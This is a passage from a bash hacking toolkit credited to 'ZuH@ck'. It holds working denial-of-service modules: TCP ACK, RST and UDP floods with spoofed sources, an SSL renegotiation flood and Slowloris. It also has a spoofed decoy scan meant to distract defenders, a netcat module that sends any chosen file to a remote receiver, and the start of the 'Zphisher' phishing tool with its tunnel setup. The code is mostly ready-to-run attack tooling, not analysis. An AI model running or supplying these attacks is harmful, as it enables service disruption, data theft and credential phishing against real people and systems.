		sudo hping3 -d $DATA --flood --frag -p $PORT -A $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -A $TARGET
	fi
#No hping3 so using nping for TCP ACK Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP ACK Flood with nping..this will work but is not ideal"
#need a valid target ip/hostname
		echo "Enter target:"
	read -i $TARGET -e TARGET
#need a valid target port
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#define source IP or use outgoing interface IP
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP ACK Flood..."
#begin TCP ACK flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END TCPACKFLOOD##
###################

#####################
##START TCPRSTFLOOD##
rstflood()
{		echo "TCP RST Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP RST Flood
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP RST packets to
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the RST packet?  Default is to send no data
	echo "Send data with RST packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP RST flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -R $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -R $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -R $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -R $TARGET
	fi
#No hping3 so using nping for TCP RST Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP RST Flood with nping..this will work but is not ideal"
#need a valid target ip/hostname
		echo "Enter target:"
	read -i $TARGET -e TARGET
#need a valid target port
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#define source IP or use outgoing interface IP
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP RST Flood..."
#begin TCP RST flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END TCPRSTFLOOD##
###################

##################
##START UDPFLOOD##
udpflood()
{ echo "UDP Flood uses hping3...checking for hping3..."
#check for hping on the local system
if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for UDP Flood
#need a valid target IP/hostname
	echo "Enter target:"
		read -i $TARGET -e TARGET
#need a valid target UDP port
	echo "Enter target port (defaults to 80):"
		read -i $PORT -e PORT
		: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#what data should we send with each packet?
#curently only accepts stdin.  Can't define a file to read from
	echo "Enter random string (data to send):"
		read DATA
#what source IP should we write to sent packets?
	echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
		read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#start the attack using values defined earlier
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --spoof $SOURCE --udp --sign $DATA -p $PORT $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --rand-source --udp --sign $DATA -p $PORT $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
#if no valid source option is selected, use outgoing interface IP
	else echo "Not a valid option!  Using interface IP"
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
	fi
#If no hping3, use nping for UDP Flood instead.  Not ideal but it will work.
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying UDP Flood with nping.."
		echo "Enter target:"
#need a valid target IP/hostname
	read -i $TARGET -e TARGET
		echo "Enter target port (defaults to 80):"
#need a port to send UDP packets to
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#what source address should we use in sent packets?
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#how many packets should we try to send each second?
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
#how many packets should we send in total?
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
#default values will send 10k packets each second, for 10 seconds
#what data should we send with each packet?
#curently only accepts stdin.  Can't define a file to read from
		echo "Enter string to send (data):"
	read DATA
		echo "Starting UDP Flood..."
#start the UDP flood using values we defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
fi
}
##END UDPFLOOD##
################

################
##START SSLDOS##
ssldos()
{ echo "Using openssl for SSL/TLS DOS"
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a target port
		echo "Enter target port (defaults to 443):"
read -i $PORT -e PORT
: ${PORT:=443}
#check a valid target port is entered otherwise assume port 443
if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
	PORT=443 && echo "You provided a string, not a port number!  Reverting to port 443"
fi
if [ "$PORT" -lt "1" ]; then
	PORT=443 && echo "Invalid port number chosen!  Reverting to port 443"
elif [ "$PORT" -gt "65535" ]; then
	PORT=443 && echo "Invalid port number chosen!  Reverting to port 443"
else echo "Using port $PORT"
fi
#do we want to use client renegotiation?
	echo "Use client renegotiation? [y]es or [n]o (default):"
read NEGOTIATE
: ${NEGOTIATE:=n}
if [[ $NEGOTIATE = y ]]; then
#if client renegotiation is selected for use, launch the attack supporting it
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
while : for i in {1..10}
	do echo "spawning instance, attempting client renegotiation"; echo "R" | openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
elif [[ $NEGOTIATE = n ]]; then
#if client renegotiation is not requested, lauch the attack without support for it
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
while : for i in {1..10}
	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
#if an invalid option is chosen for client renegotiation, launch the attack without it
else
	echo "Invalid option, assuming no client renegotiation"
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
while : for i in {1..10}
	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
fi
#The SSL/TLS DOS code is crude but it can be brutally effective
}
##END SSLDOS##
##############

##################
##START SLOWLORIS##
slowloris()
{ echo "Using netcat for Slowloris attack...." && sleep 1
echo "Enter target:"
#need a target IP or hostname
	read -i $TARGET -e TARGET
echo "Target is set to $TARGET"
#need a target port
echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#how many connections should we attempt to open with the target?
#there is no hard limit, it depends on available resources.  Default is 2000 simultaneous connections
echo "Enter number of connections to open (default 2000):"
		read CONNS
	: ${CONNS:=2000}
#ensure a valid integer is entered
	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
CONNS=2000 && echo "Invalid integer!  Using 2000 connections"
	fi
#how long do we wait between sending header lines?
#too long and the connection will likely be closed
#too short and our connections have little/no effect on server
#either too long or too short is bad.  Default random interval is a sane choice
echo "Choose interval between sending headers."
echo "Default is [r]andom, between 5 and 15 seconds, or enter interval in seconds:"
	read INTERVAL
	: ${INTERVAL:=r}
	if [[ "$INTERVAL" = "r" ]]
then
#if default (random) interval is chosen, generate a random value between 5 and 15
#note that this module uses $RANDOM to generate random numbers, it is sufficient for our needs
INTERVAL=$((RANDOM % 11 + 5))
#check that r (random) or a valid number is entered
	elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]
then
#if not r (random) or valid number is chosen for interval, assume r (random)
INTERVAL=$((RANDOM % 11 + 5)) && echo "Invalid integer!  Using random value between 5 and 15 seconds"
	fi
#run stunnel_client function
stunnel_client
if [[ "$SSL" = "y" ]]
then
#if SSL is chosen, set the attack to go through local stunnel listener
echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
echo "Opened $CONNS connections....returning to menu"
else
#if SSL is not chosen, launch the attack on the server without using a local listener
echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
#return to menu once requested number of connections has been opened or resources are exhausted
echo "Opened $CONNS connections....returning to menu"
fi
}
##END SLOWLORIS##
#################

#####################
##START DISTRACTION##
distractionscan()
{ echo "This module will send a TCP SYN scan with a spoofed source address"
echo "This module is designed to be obvious, to distract your target from any real scan or other activity you may actually be performing"
echo "Enter target:"
#need target IP/hostname
read -i $TARGET -e TARGET
echo "Enter spoofed source address:"
#need a spoofed source address
read -i $SOURCE -e SOURCE
#use hping to perform multiple obvious TCP SYN scans
for i in {1..5}; do echo "sending scan $i" && sudo hping3 --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
exit 0
}
##END DISTRACTION##
###################
##/DOS##


##EXTRACTION##
########################
##START EXTRACTIONMENU##
extractionmenu()
{
#display a menu for the extraction module using bash select
        extractionmenu=("Send File" "Create Listener" "Go back")
    select extractopt in "${extractionmenu[@]}"; do
#Extract file with TCP or UDP
    if [ "$extractopt" = "Send File" ]; then
        sendfile
#Create an arbitrary listener to receive files
    elif [ "$extractopt" = "Create Listener" ]; then
		listener
#Go back
    elif [ "$extractopt" = "Go back" ]; then
        mainmenu
#Default error if no valid option is chosen
    else
        echo "That's not a valid option! Hit Return to show menu"
    fi
    done
}
##END EXTRACTIONMENU##
######################

##################
##START SENDFILE##
sendfile()
	{ echo "This module will allow you to send a file over TCP or UDP"
	echo "You can use the Listener to receive such a file"
echo "Enter protocol, [t]cp (default) or [u]dp:"
	read -i $PROTO -e PROTO
	: ${PROTO:=t}
#if not t (tcp) or u (udp) is chosen, assume tcp required
if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
	echo "Invalid protocol option selected, assuming tcp!" && PROTO=t && echo ""
fi
echo "Enter the IP of the receving server:"
#need to know the IP of the receiving end
  read -i $RECEIVER -e RECEIVER
#need to know a destination port on the server
  echo "Enter port number for the destination server (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#what file are we sending?
  echo "Enter the FULL PATH of the file you want to extract:"
  read -i $EXTRACT -e EXTRACT
#send the file
echo "Sending the file to $RECEIVER:$PORT"
if [ "$PROTO" = "t" ]; then
nc -w 3 -n -N $RECEIVER $PORT < $EXTRACT
else
nc -n -N -u $RECEIVER $PORT < $EXTRACT
fi
echo "Done"
#generate hashes of file we are sending
echo "Generating hash checksums"
md5sum $EXTRACT
echo ""
sha512sum $EXTRACT
sleep 1
}
##END SENDFILE##
################

##################
##START LISTENER##
listener()
	{ echo "This module will create a TCP or UDP listener using netcat"
	echo "Any data (string or file) received will be written out to ./pentmenu.listener.out"
echo "Enter protocol, [t]cp (default) or [u]dp:"
	read -i $PROTO -e PROTO
	: ${PROTO:=t}
#if not t (tcp) or u (udp) is chosen, assume tcp listener required
if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
	echo "Invalid protocol option selected, assuming tcp!" && PROTO=t && echo ""
fi
#show listening ports on system using ss (if available) otherwise use netstat
	echo "Listing current listening ports on this system.  Do not attempt to create a listener on one of these ports, it will not work." && echo ""
if test -f "/bin/ss"; then
	LISTPORT=ss;
	else LISTPORT=netstat

fi
#now we can ask what port to create listener on
#it cannot of course listen on a port already in use
	$LISTPORT -$PROTO -n -l
echo "Enter port number to listen on (defaults to 8000):"
	read -i $PORT -e PORT
	: ${PORT:=8000}
#if not an integer is entered, assume default port 8000
if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
		PORT=8000 && echo "You provided a string, not a port number!  Reverting to port 8000"
fi
#ensure a valid port number, between 1 and 65,535 (inclusive) is entered
if [ "$PORT" -lt "1" ]; then
		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000"
	elif [ "$PORT" -gt "65535" ]; then
		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000"
fi
#define where to save everything received to the listener
echo "Enter output file (defaults to pentmenu.listener.out):"
	read -i $OUTFILE -e OUTFILE
	: ${OUTFILE:=pentmenu.listener.out}
echo "Use ctrl c to stop"
#create the listener
if [ "$PROTO" = "t" ] && [ "$PORT" -lt "1025" ]; then
	sudo nc -n -l -v -p $PORT > $OUTFILE
elif  [ "$PROTO" = "t" ] && [ "$PORT" -gt "1024" ]; then
	nc -n -l -v -p $PORT > $OUTFILE
elif  [ "$PROTO" = "u" ] && [ "$PORT" -lt "1025" ]; then
	sudo nc -n -u -k -l -v -p $PORT > $OUTFILE
elif  [ "$PROTO" = "u" ] && [ "$PORT" -gt "1024" ]; then
	nc -n -u -k -l -v -p $PORT > $OUTFILE
fi
#done message and checksums will only work for tcp file transfer
#with udp, the connection has to be manually closed with 'ctrl C'
sync && echo "Done"
#generate hashes of file received
echo "Generating hash checksums"
md5sum $OUTFILE
echo ""
sha512sum $OUTFILE
sleep 1
}
##END LISTENER##
################
##/EXTRACTION##


##README##
####################
##START SHOWREADME##
showreadme()
#use curl to show the readme file
#i should probably add a check for a local copy
{
curl -s https://ekovegeance.github.io/DDOS/readme.txt | more
}
##END SHOWREADME##
##################
##/README##


##GENERIC##
#################
##START STUNNEL##
stunnel_client()
{ echo "use SSL/TLS? [y]es or [n]o (default):"
	read SSL
	: ${SSL:=n}
#if not using SSL/TLS, carry on what we were doing
#otherwise create an SSL/TLS tunnel using a local listener on TCP port 9991
if [[ "$SSL" = "y" ]]
	then echo "Using SSL/TLS"
LHOST=127.0.0.1
LPORT=9991
#ascertain if stunnel is defined in /etc/services and if not, add it & set permissions correctly
grep -q $LPORT /etc/services
if [[ $? = 1 ]]
then
echo "Adding pentmenu stunnel service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
fi
#is ss is available, use that to shoew listening ports
if test -f "/bin/ss"; then
	LISTPORT=ss;
#otherwise use netstat
	else LISTPORT=netstat
fi
#show listening ports and check for port 9991
$LISTPORT -tln |grep -q $LPORT
if [[ "$?" = "1" ]]
#if nothing is running on port 9991, create stunnel configuration
then
	echo "Creating stunnel client on $LHOST:$LPORT"
		sudo rm -f /etc/stunnel/pentmenu.conf;
		sudo touch /etc/stunnel/pentmenu.conf && sudo chmod 777 /etc/stunnel/pentmenu.conf
		sudo echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
		sudo echo "client=yes" >> /etc/stunnel/pentmenu.conf
		sudo echo "accept=$LHOST:$LPORT" >> /etc/stunnel/pentmenu.conf
		sudo echo "connect=$TARGET:$PORT" >> /etc/stunnel/pentmenu.conf
		sudo echo "verify=0" >> /etc/stunnel/pentmenu.conf
		sudo chmod 644 /etc/stunnel/pentmenu.conf
		sudo stunnel /etc/stunnel/pentmenu.conf && sleep 1
#if stunnel listener is already active we don't bother recreating it
else echo "Looks like stunnel is already listening on port 9991, so not recreating"
fi
fi }
##END STUNNEL##
###############
##/GENERIC##


##WELCOME##
#########################
##START WELCOME MESSAGE##
#everything before this is a function and functions have to be defined before they can be used
#so the welcome message MUST be placed at the end of the script
	clear && echo ""
echo " "
echo -e $red
clear

echo -e " \e[1;31m 
\033[0;33m     111     111       111        111111     1111111111                 
\033[0;32m     111 111 111      11 11       11  11        111
\033[0;36m     111  1  111     1111111      111111        111
\033[1;33m     111     111    11     11     11 11         111
\033[0;31m     111     111   11       11    11  11        111
\e[0m "



echo ""
echo -e $white

mainmenu
##END WELCOME MESSAGE##
#######################

##############DDOS ZuH@ck code end###################

##############ZPhisher Phishing Start #############

fi

if [ $zuzu = 4 ] || [ $zuzu = 04 ]
then
###############start
#!/bin/bash

##   Zphisher 	: 	Automated Phishing Tool
##   Author 	  :   BL4CK -	ZuH@ck
##   Version 	  :   2.2


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

## Banner
banner() {
	cat <<- EOF
		${ORANGE}
		${ORANGE} ______      _     _     _               
		${ORANGE}|___  /     | |   (_)   | |              
		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
		${ORANGE}      | |                                
		${ORANGE}      |_|                ${RED}Version : 2.2

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by ZuH@ck ( M.A.H.T )${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
		${BLUE}
		${BLUE}  â–‘â–€â–€â–ˆâ–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–‘â–ˆâ–‘â–€â–ˆâ–€â–‘â–ˆâ–€â–€â–‘â–ˆâ–‘â–ˆâ–‘â–ˆâ–€â–€â–‘â–ˆâ–€â–„
		${BLUE}  â–‘â–„â–€â–‘â–‘â–ˆâ–€â–€â–‘â–ˆâ–€â–ˆâ–‘â–‘â–ˆâ–‘â–‘â–€â–€â–ˆâ–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–€â–‘â–ˆâ–€â–„
		${BLUE}  â–‘â–€â–€â–€â–‘â–€â–‘â–‘â–‘â–€â–‘â–€â–‘â–€â–€â–€â–‘â–€â–€â–€â–‘â–€â–‘â–€â–‘â–€â–€â–€â–‘â–€â–‘â–€${WHITE} 2.2
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi

        if [[ `command -v tput` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
            pkg install ncurses-utils -y
        fi

    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
		{ reset_color; exit 1; }
	fi
}

## Download Cloudflared
download_cloudflared() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		mv -f "$file" .server/cloudflared > /dev/null 2>&1
		chmod +x .server/cloudflared > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
